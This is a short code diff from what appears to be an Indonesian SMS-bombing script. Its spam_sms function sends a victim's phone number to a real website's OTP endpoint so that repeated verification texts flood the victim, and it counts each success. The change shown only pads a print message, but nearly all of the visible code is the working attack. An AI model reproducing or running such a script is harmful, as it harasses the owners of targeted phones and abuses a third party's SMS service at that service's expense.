@@ -59,7 +59,7 @@ def spam_sms(nomor):
 		# Spam Sms 1 By Ipot Id
 		date = {"action": "send_user_otp", "resendc": "2", "user_phone": "62"+nomor}
 		post = ses.post("https://infokost.id/wp-admin/admin-ajax.php", data=date).text
-		if "ok" in post: no += 1; print(f"\r[{no}] sukses spam sms")
+		if "ok" in post: no += 1; print(f"\r[{no}] sukses spam sms      ")
 		ses.cookies.clear(); ses.close()
 	except Exception as e: pass
 	
